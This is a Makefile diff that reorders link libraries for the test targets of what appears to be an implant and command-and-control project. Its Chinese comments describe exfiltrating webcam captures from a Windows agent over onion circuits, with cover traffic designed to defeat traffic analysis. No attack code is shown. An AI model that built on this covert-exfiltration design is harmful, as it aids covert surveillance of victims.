@@ -61,9 +61,9 @@ $(BUILD)/sched.o: src/sched.c include/exfil_sched.h | $(BUILD)
 $(BUILD)/task.o: src/task.c include/exfil_task.h include/exfil_sched.h | $(BUILD)
 	$(CC) $(CFLAGS) -c $< -o $@
 
-$(BUILD)/test_task: tests/test_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/test_task: tests/test_task.c $(BUILD)/task.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 任务通道与已建立电路的 IO 绑定：长度前缀帧 + 双向 IV 计数 + seq 单调性
 # （c2_frame 把 IV 放线上、不跟踪计数器，重放防护只能由本层补）
@@ -78,45 +78,45 @@ $(BUILD)/tol.o: src/tol.c include/exfil_tol.h include/exfil_task_link.h | $(BUIL
 # -> 回执原路返回。含篡改/错密钥/重放/超长声明取证。
 # 重连恢复接进真实洋葱电路：断开 -> 重建电路 -> 用恢复点续用会话。
 # 含"计数归零 => IV 重用 => 必须 AUTH"的反证用例。
-$(BUILD)/test_task_resume: tests/test_task_resume.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/test_task_resume: tests/test_task_resume.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
 	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(LATLIB) $(C2OBJS) $(P2PLIB)
 
-$(BUILD)/test_task_circuit: tests/test_task_circuit.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/test_task_circuit: tests/test_task_circuit.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
 	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(LATLIB) $(C2OBJS) $(P2PLIB)
 
-$(BUILD)/test_tol: tests/test_tol.c $(BUILD)/tol.o $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/test_tol: tests/test_tol.c $(BUILD)/tol.o $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/tol.o $(BUILD)/task.o $(BUILD)/task_link.o \
 	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 $(BUILD)/test_sched: tests/test_sched.c $(BUILD)/sched.o
 	$(CC) $(CFLAGS) $< $(BUILD)/sched.o -o $@
 
 # 调度层与真实回传链路的集成对照：无限速 vs 调度门控，实测线上信元/字节
-$(BUILD)/test_sched_gate: tests/test_sched_gate.c $(BUILD)/sched.o $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
+$(BUILD)/test_sched_gate: tests/test_sched_gate.c $(BUILD)/sched.o $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/sched.o $(BUILD)/exfil.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
+	  $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
 
 # 端到端：采集产物经**真实洋葱电路**（3 跳真进程）回传并对端重组
-$(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(LATLIB) $(C2OBJS) $(P2PLIB)
 
-$(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
-	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(P2PLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 跨语言对齐工具：C 侧走真实会话派生编码出信元流 -> 文件，
 # 供 13_c2_server（Python ExfilSink）解码比对。必须由 C 侧真编码才测得准。
-$(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
-	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(P2PLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 端到端：agent_windows 采集 -> JPEG -> exfil 信元 -> 重组校验
-$(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
-	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
+$(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
 
 # 自适应覆盖流量接入真实发送循环：提交 + 泵送（入队-出片交替）。
 # 依赖 14_p2p 的 mix/cover（libp2p.a）与 exfil 的 chan/link。
@@ -125,15 +125,15 @@ $(BUILD)/link_cover.o: src/link_cover.c include/exfil_link_cover.h include/exfil
 
 # 真实进程端到端：fork + socketpair，父发子收。验证空闲期覆盖流量在线上
 # 流动、覆盖不吃掉数据、大载荷分批入队发完、换信道覆盖自动缩放。
-$(BUILD)/test_link_cover: tests/test_link_cover.c $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/test_link_cover: tests/test_link_cover.c $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 跨语言对齐工具：C 侧真编码任务/回执 -> 文件，供 Python 侧解码比对；
 # 反向模式 chk 则读取 Python 生成的 wire 并解码，实现双向验证。
-$(BUILD)/dump_task: tests/dump_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+$(BUILD)/dump_task: tests/dump_task.c $(BUILD)/task.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
-	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 任务通道的覆盖流量维持：空闲期按预算持续吐出恒长 PAD 信元，消除
 # 「链路静默=操作员空闲」「突发一个包=刚下了命令」的观测对应。
@@ -144,10 +144,10 @@ $(BUILD)/task_cover.o: src/task_cover.c include/exfil_task_cover.h \
 
 $(BUILD)/test_task_cover: tests/test_task_cover.c $(BUILD)/task_cover.o \
     $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
-    $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+    $(BUILD)/exfil.o $(BUILD)/sched.o $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task_cover.o $(BUILD)/task.o \
 	  $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
-	  $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(BUILD)/sched.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 任务通道的**真实事件循环**：把覆盖从"可调用的函数"变成"长期运行的行为"。
 # 两端各跑一个实例（下行由服务端补、上行由植入体补），只在一端跑覆盖会让
@@ -161,10 +161,10 @@ $(BUILD)/cover_loop.o: src/cover_loop.c include/cover_loop.h \
 $(BUILD)/test_cover_loop: tests/test_cover_loop.c $(BUILD)/cover_loop.o \
     $(BUILD)/task_cover.o $(BUILD)/task.o $(BUILD)/task_link.o \
     $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o \
-    $(P2PLIB) $(C2OBJS) $(LATLIB)
+    $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/cover_loop.o $(BUILD)/task_cover.o \
 	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
-	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 覆盖循环接进**真实洋葱电路**的长跑：3 跳真进程 + tee 旁路抓包。
 # 验证恒定形态在真实转发路径上仍成立，且做 budget=0 静默对照——
@@ -172,27 +172,27 @@ $(BUILD)/test_cover_loop: tests/test_cover_loop.c $(BUILD)/cover_loop.o \
 $(BUILD)/test_cover_circuit: tests/test_cover_circuit.c $(BUILD)/cover_loop.o \
     $(BUILD)/task_cover.o $(BUILD)/task.o $(BUILD)/task_link.o \
     $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o \
-    $(P2PLIB) $(C2OBJS) $(LATLIB)
+    $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/cover_loop.o $(BUILD)/task_cover.o \
 	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
-	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 产物回传通道（上行）的覆盖取证：真实 3 跳洋葱电路 + tee 旁路抓包。
 # 与 test_cover_circuit（任务通道/下行）互补——产物回传是周期性突发，
 # 核心指标是「批间静默 max_gap」而非「尾部静默」。
 $(BUILD)/test_exfil_cover_circuit: tests/test_exfil_cover_circuit.c \
     $(BUILD)/link_cover.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
-    $(P2PLIB) $(C2OBJS) $(LATLIB)
+    $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
-	  $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 大产物突发（100KB -> 204 信元/批）下的批间静默取证。
 # 小产物场景已证 19 倍差异；大产物是真实采集负载，此前从未测过。
 $(BUILD)/test_exfil_burst_cover: tests/test_exfil_burst_cover.c \
     $(BUILD)/link_cover.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
-    $(P2PLIB) $(C2OBJS) $(LATLIB)
+    $(LATLIB) $(C2OBJS) $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
-	  $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+	  $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
 	./$(BUILD)/test_exfil
